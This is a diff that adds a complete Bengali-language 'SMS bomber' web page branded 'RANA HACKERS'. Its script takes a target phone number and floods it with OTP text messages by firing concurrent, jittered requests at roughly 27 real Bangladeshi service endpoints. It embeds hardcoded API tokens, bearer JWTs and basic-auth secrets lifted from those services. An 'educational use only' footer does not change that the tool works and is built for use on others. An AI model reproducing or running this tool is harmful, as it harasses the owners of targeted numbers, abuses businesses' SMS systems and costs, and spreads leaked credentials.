@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>⚡ স্মুথ বোম্বার | RANA HACKERS</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0a0f1e, #0c1222);
+            min-height: 100vh;
+            padding: 20px;
+            transition: all 0.3s;
+        }
+
+        body.light {
+            background: #eef2f9;
+        }
+
+        .container {
+            max-width: 650px;
+            margin: auto;
+            background: rgba(20, 22, 40, 0.85);
+            backdrop-filter: blur(12px);
+            border-radius: 2rem;
+            padding: 1.6rem;
+            box-shadow: 0 20px 35px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        body.light .container {
+            background: rgba(255, 255, 255, 0.95);
+            border: 1px solid #ccc;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 1.6rem;
+            background: linear-gradient(90deg, #ff416c, #ff4b2b);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 1.2rem;
+        }
+
+        .field {
+            margin-bottom: 1rem;
+        }
+
+        label {
+            display: block;
+            font-size: 0.7rem;
+            font-weight: 600;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+            opacity: 0.8;
+        }
+
+        input, select, button {
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: 1rem;
+            border: none;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 0.9rem;
+        }
+
+        body.light input, body.light select {
+            background: #f0f2f5;
+            color: #111;
+            border: 1px solid #ccc;
+        }
+
+        button {
+            background: #ff416c;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        button:hover:not(:disabled) {
+            transform: scale(1.02);
+            filter: brightness(1.05);
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .row {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+
+        .row > * {
+            flex: 1;
+            min-width: 110px;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 10px 16px;
+            border-radius: 2rem;
+            margin: 1rem 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #2d2d44;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 8px 0;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff416c, #ff4b2b);
+            transition: width 0.2s;
+        }
+
+        .log-box {
+            background: #0b0b15;
+            border-radius: 1.2rem;
+            padding: 12px;
+            height: 210px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 0.75rem;
+            margin-top: 1rem;
+        }
+
+        body.light .log-box {
+            background: #f9f9ff;
+            border: 1px solid #ddd;
+        }
+
+        .log-entry {
+            padding: 4px 0;
+            border-bottom: 1px solid #222;
+            word-break: break-word;
+        }
+
+        footer {
+            text-align: center;
+            font-size: 0.6rem;
+            margin-top: 1rem;
+            opacity: 0.6;
+        }
+
+        .theme-toggle {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            background: #222;
+            padding: 6px 14px;
+            border-radius: 30px;
+            font-size: 0.75rem;
+            cursor: pointer;
+            z-index: 999;
+            font-weight: bold;
+        }
+
+        @media (max-width: 550px) {
+            .container {
+                padding: 1rem;
+            }
+            .row {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="theme-toggle" id="themeToggle">🌙 ডার্ক</div>
+<div class="container">
+    <h1>💥 স্মুথ বোম্বার 💥</h1>
+
+    <div class="field">
+        <label>📞 টার্গেট নম্বর (01XXXXXXXXX)</label>
+        <input type="tel" id="phone" placeholder="017xxxxxxxx" autocomplete="off">
+    </div>
+
+    <div class="row">
+        <div>
+            <label>🔢 মোট এসএমএস</label>
+            <input type="number" id="amount" value="50" min="1" max="200">
+        </div>
+        <div>
+            <label>⚡ সমান্তরাল থ্রেড</label>
+            <select id="concurrency">
+                <option>1</option>
+                <option selected>2</option>
+                <option>3</option>
+                <option>4</option>
+            </select>
+        </div>
+        <div>
+            <label>⏱️ বিলম্ব (মিন-ম্যাক্স ms)</label>
+            <input type="text" id="delay" value="250-600">
+        </div>
+        <div>
+            <label>🔄 পুনশ্চেষ্টা</label>
+            <select id="retries">
+                <option>0</option>
+                <option selected>1</option>
+                <option>2</option>
+            </select>
+        </div>
+    </div>
+
+    <div class="row">
+        <div>
+            <label>🔊 সাউন্ড</label>
+            <select id="sound">
+                <option value="on">চালু</option>
+                <option value="off">বন্ধ</option>
+            </select>
+        </div>
+        <div>
+            <label>&nbsp;</label>
+            <button id="startBtn">🚀 শুরু করুন</button>
+        </div>
+        <div>
+            <label>&nbsp;</label>
+            <button id="stopBtn" disabled>⏹️ থামান</button>
+        </div>
+    </div>
+
+    <div class="stats">
+        <span>✅ সফল: <strong id="successCount">0</strong></span>
+        <span>❌ ব্যর্থ: <strong id="failCount">0</strong></span>
+        <span>📊 অগ্রগতি: <strong id="processedCount">0</strong>/<strong id="totalCount">0</strong></span>
+    </div>
+
+    <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+
+    <div class="log-box" id="logBox">
+        <div class="log-entry">🟢 সিস্টেম প্রস্তুত। নম্বর ও পরিমাণ দিন।</div>
+    </div>
+
+    <footer>⚡ শুধুমাত্র শিক্ষাগত কাজে | নিজের নম্বরে টেস্ট করুন</footer>
+</div>
+
+<script>
+    // ======================= সকল API (লিমিট বাড়ানো হয়েছে - মোট কল বড়) =======================
+    const apis = [
+        { name: "Cihno", limit: 8, func: async (p) => { let r=await fetch('https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp',{method:'POST',headers:{'Content-Type':'application/json','authorization':'Otp bnVsbA=='},body:JSON.stringify({countryId:"19",mobileNumber:p,purpose:"registration"})}); let j=await r.json(); if(j.otpsent==='false')throw new Error(); } },
+        { name: "ChinaOnline", limit: 6, func: async (p) => { let r=await fetch(`https://chinaonlineapi.com/api/v1/get/otp?phone=${p}`,{headers:{'token':'gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219'}}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "ProthomAlo", limit: 6, func: async (p) => { let r=await fetch('https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phoneNumber:"+88"+p})}); let j=await r.json(); if(j.error)throw new Error(); } },
+        { name: "Deeptoplay", limit: 6, func: async (p) => { let r=await fetch('https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({number:p})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "JatriRental", limit: 6, func: async (p) => { let r=await fetch('https://user-api.jslglobal.co:444/v1/send-otp',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({phone:`+88${p}`,jatri_token:'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "Jotno", limit: 6, func: async (p) => { let r=await fetch('https://gw.jotno.net/auth/login/token',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:p})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "Osudpotro", limit: 6, func: async (p) => { let r=await fetch('https://api.osudpotro.com/api/v1/users/send_otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mobile:'+88-'+p,deviceToken:'app',language:'bn',os:'android'})}); let j=await r.json(); if(j.otpsent==='false')throw new Error(); } },
+        { name: "Paperfly", limit: 6, func: async (p) => { let r=await fetch('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({full_name:"Test",company_name:"Test",email_address:"test@x.com",phone_number:p})}); let j=await r.json(); if(j.otpsent==='false')throw new Error(); } },
+        { name: "QuizGiri", limit: 6, func: async (p) => { let r=await fetch('https://developer.quizgiri.xyz/api/v2.0/send-otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({country_code:"+880",phone:p})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "QuizTime", limit: 6, func: async (p) => { let r=await fetch('https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({country_code:"+88",phone:p})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "Shikho", limit: 6, func: async (p) => { let r=await fetch('https://api.shikho.com/auth/v2/send/sms',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p,type:'student',auth_type:'signup',vendor:'shikho'})}); let j=await r.json(); if(j.otpsent==='false')throw new Error(); } },
+        { name: "Toybox", limit: 6, func: async (p) => { let r=await fetch('https://api.toybox.live/bdapps_handler.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({Operation:"CreateSubscription",MobileNumber:"88"+p,PackageID:100,Secret:"HJKX71%UHYH"})}); let j=await r.json(); if(j.otpsent==='false')throw new Error(); } },
+        { name: "Jatri2", limit: 6, func: async (p) => { let r=await fetch('https://user-api.jslglobal.co/v1/send-otp',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':'okhttp/3.9'},body:new URLSearchParams({phone:`+88${p}`,jatri_token:'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "Betonbook", limit: 6, func: async (p) => { let r=await fetch('https://api.betonbook.com/api/v5/auth/otp/request',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p,language:1})}); let j=await r.json(); if(j.otpsent==='false')throw new Error(); } },
+        { name: "Applink", limit: 6, func: async (p) => { let r=await fetch('https://applink.com.bd/appstore-v4-server/login/otp/request',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msisdn:"88"+p})}); let j=await r.json(); if(j.otpsent==='false')throw new Error(); } },
+        { name: "RobiOffer", limit: 6, func: async (p) => { let r=await fetch('https://webapi.robi.com.bd/v1/send-otp',{method:'POST',headers:{'Authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjE4MSwibmJmIjoxNjkyNjQyMTgxLCJleHAiOjE2OTI2NDU3ODEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.zIjqAeTCI-kFmH5nTuAII1HzQISfOLOyLfYH4FlcjXA','Content-Type':'application/json'},body:JSON.stringify({phone_number:p,type:'my_offer'})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "RobiRegister", limit: 6, func: async (p) => { let r=await fetch('https://webapi.robi.com.bd/v1/account/register/otp',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0','Authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0'},body:JSON.stringify({phone_number:p})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "Softmax", limit: 7, func: async (p) => { let r=await fetch('https://softmaxmanager.xyz/api/v1/user/request/otp/',{method:'POST',headers:{'user-agent':'Dart/3.4','content-type':'application/x-www-form-urlencoded','authorization':'Basic c29zOjI3TTMjYTRz'},body:new URLSearchParams({phone_number:'+88'+p,app_signature:'Fu89B%2BdY9dz'})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "TrainingGov", limit: 7, func: async (p) => { let r=await fetch('https://training.gov.bd/backoffice/api/user/sendOtp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mobile:p})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "Doctime", limit: 7, func: async (p) => { let r=await fetch('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:{code:'88',contact_no:p,country_calling_code:'88',headers:{PlatForm:'Web'}}})}); let j=await r.json(); if(j.error)throw new Error(); } },
+        { name: "EasyBD", limit: 7, func: async (p) => { let r=await fetch('https://core.easy.com.bd/api/v1/registration',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mobile:p,name:"Test",email:"t@t.com",password:"pass123",password_confirmation:"pass123",device_key:"12345"})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "Banglalink", limit: 7, func: async (p) => { let r=await fetch('https://eshop-api.banglalink.net/api/v1/customer/send-otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:"phone",phone:p})}); let j=await r.json(); if(j.otpsent==='false')throw new Error(); } },
+        { name: "Hishabee", limit: 6, func: async (p) => { let r=await fetch(`https://app.hishabee.business/api/V2/otp/send?mobile_number=${p}`,{method:'POST'}); let j=await r.json(); if(j.status==='failed')throw new Error(); } },
+        { name: "Skitto", limit: 6, func: async (p) => { let r=await fetch(`https://www.skitto.com/replace-sim/sent-otp/${p}`); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "RobiDA", limit: 6, func: async (p) => { let r=await fetch('https://da-api.robi.com.bd/da-nll/otp/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msisdn:p})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "Chardike", limit: 6, func: async (p) => { let r=await fetch('https://api.chardike.com/api/otp/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p,otp_type:"login"})}); let j=await r.json(); if(j.status==='Failed')throw new Error(); } },
+        { name: "Apex4u", limit: 8, func: async (p) => { let r=await fetch('https://api.apex4u.com/api/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phoneNumber:p})}); let j=await r.json(); if(j.otpsent==='false')throw new Error(); } }
+    ];
+
+    // ---------- গ্লোবাল স্টেট ----------
+    let running = false, stopFlag = false, activeWorkers = 0;
+    let success = 0, fail = 0, processed = 0, totalJobs = 0;
+    let currentQueue = [];
+
+    function addLog(msg, type = 'info') {
+        const logDiv = document.createElement('div');
+        logDiv.className = 'log-entry';
+        if (type === 'success') logDiv.style.color = '#2ecc71';
+        else if (type === 'error') logDiv.style.color = '#e74c3c';
+        else logDiv.style.color = '#3b82f6';
+        logDiv.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        document.getElementById('logBox').appendChild(logDiv);
+        logDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        if (document.getElementById('sound').value === 'on') {
+            try {
+                let ctx = new (AudioContext || webkitAudioContext)();
+                let osc = ctx.createOscillator();
+                let gain = ctx.createGain();
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.frequency.value = type === 'success' ? 880 : 440;
+                gain.gain.value = 0.08;
+                osc.start();
+                gain.gain.exponentialRampToValueAtTime(0.00001, ctx.currentTime + 0.3);
+                osc.stop(ctx.currentTime + 0.3);
+            } catch (e) { }
+        }
+    }
+
+    function updateUI() {
+        document.getElementById('successCount').innerText = success;
+        document.getElementById('failCount').innerText = fail;
+        document.getElementById('processedCount').innerText = processed;
+        document.getElementById('totalCount').innerText = totalJobs;
+        let percent = totalJobs ? (processed / totalJobs) * 100 : 0;
+        document.getElementById('progressFill').style.width = percent + '%';
+    }
+
+    async function callWithRetry(apiFunc, phone, retriesLeft) {
+        for (let i = 0; i <= retriesLeft; i++) {
+            try {
+                await apiFunc(phone);
+                return true;
+            } catch (e) {
+                if (i === retriesLeft) throw e;
+                await new Promise(r => setTimeout(r, 400));
+            }
+        }
+        return false;
+    }
+
+    async function worker(phone, retries, minDelay, maxDelay) {
+        while (running && !stopFlag && currentQueue.length > 0) {
+            const task = currentQueue.shift();
+            const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1) + minDelay);
+            await new Promise(r => setTimeout(r, delay));
+            try {
+                await callWithRetry(task.func, phone, retries);
+                success++;
+                addLog(`✅ ${task.name} সফল`, 'success');
+            } catch (err) {
+                fail++;
+                addLog(`❌ ${task.name} ব্যর্থ`, 'error');
+            }
+            processed++;
+            updateUI();
+        }
+        activeWorkers--;
+        if (activeWorkers === 0 && running) {
+            running = false;
+            stopFlag = false;
+            addLog(`🏁 সম্পন্ন! সফল: ${success}, ব্যর্থ: ${fail}`, 'info');
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+        }
+    }
+
+    async function startBombing() {
+        if (running) {
+            addLog("ইতিমধ্যে প্রক্রিয়া চলছে!", 'error');
+            return;
+        }
+        const phone = document.getElementById('phone').value.trim();
+        if (!phone.match(/^01\d{9}$/)) {
+            addLog("❌ সঠিক নম্বর দিন (01XXXXXXXXX)", 'error');
+            return;
+        }
+        let amount = parseInt(document.getElementById('amount').value);
+        const concurrency = parseInt(document.getElementById('concurrency').value);
+        const retries = parseInt(document.getElementById('retries').value);
+        const delayParts = document.getElementById('delay').value.split('-').map(Number);
+        const minDelay = delayParts[0] || 200, maxDelay = delayParts[1] || 600;
+
+        // কিউ তৈরি: প্রতিটি API তার limit অনুসারে
+        let queue = [];
+        for (let api of apis) {
+            for (let i = 0; i < api.limit; i++) {
+                queue.push({ name: api.name, func: api.func });
+            }
+        }
+        // শাফল (র্যান্ডম ক্রম)
+        for (let i = queue.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [queue[i], queue[j]] = [queue[j], queue[i]];
+        }
+        totalJobs = Math.min(amount, queue.length);
+        if (amount > queue.length) {
+            addLog(`⚠️ সর্বোচ্চ ${queue.length} বার SMS পাঠানো সম্ভব। আপনার দেওয়া ${amount} থেকে ${totalJobs} বার হবে।`, 'info');
+        }
+        currentQueue = queue.slice(0, totalJobs);
+        success = 0; fail = 0; processed = 0; stopFlag = false; running = true;
+        updateUI();
+        document.getElementById('startBtn').disabled = true;
+        document.getElementById('stopBtn').disabled = false;
+
+        activeWorkers = Math.min(concurrency, currentQueue.length);
+        for (let i = 0; i < activeWorkers; i++) {
+            worker(phone, retries, minDelay, maxDelay);
+        }
+    }
+
+    function stopBombing() {
+        if (!running) return;
+        stopFlag = true;
+        running = false;
+        addLog("⛔ থামানোর নির্দেশ দেওয়া হয়েছে।", 'error');
+        document.getElementById('startBtn').disabled = false;
+        document.getElementById('stopBtn').disabled = true;
+    }
+
+    // থিম টগল
+    let darkMode = true;
+    document.getElementById('themeToggle').onclick = () => {
+        darkMode = !darkMode;
+        document.body.classList.toggle('light', !darkMode);
+        document.getElementById('themeToggle').innerText = darkMode ? '🌙 ডার্ক' : '☀️ লাইট';
+    };
+
+    document.getElementById('startBtn').onclick = startBombing;
+    document.getElementById('stopBtn').onclick = stopBombing;
+
+    // মোট কল ক্ষমতা দেখানো
+    const totalCapacity = apis.reduce((sum, api) => sum + api.limit, 0);
+    addLog(`✅ লোড সম্পন্ন: সর্বমোট ${totalCapacity} বার কল সম্ভব।`, 'success');
+</script>
+</body>
+</html>
